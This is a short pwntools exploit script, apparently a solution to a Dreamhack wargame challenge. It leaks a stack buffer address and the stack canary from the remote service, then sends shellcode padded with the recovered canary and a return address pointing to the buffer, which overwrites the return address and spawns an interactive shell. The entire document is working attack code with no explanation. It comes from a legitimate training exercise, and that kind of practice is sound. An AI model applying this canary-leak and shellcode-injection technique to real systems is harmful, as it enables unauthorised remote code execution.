from pwn import *
context.log_level	= "DEBUG"
context.arch        = "amd64"

p = remote("host1.dreamhack.games", 20695)

p.recvuntil("buf: ")
buffer = int(p.recvline()[:-1], 16) # Set buffer from given buffer without \n

p.recvuntil("$rbp: ") # Cannary always 
distance = int(p.recvline()[:-1])

payload = "A" * (distance - 7)
p.sendafter("Input: ", payload)

p.recvuntil(payload)
ca = u64(b"\x00" + p.recvn(7))

payload = asm(shellcraft.sh())
payload = payload.ljust(distance-8, b'A') + p64(ca) + b'B'*8 + p64(buffer)


p.sendlineafter("Input: ", payload)
p.interactive()
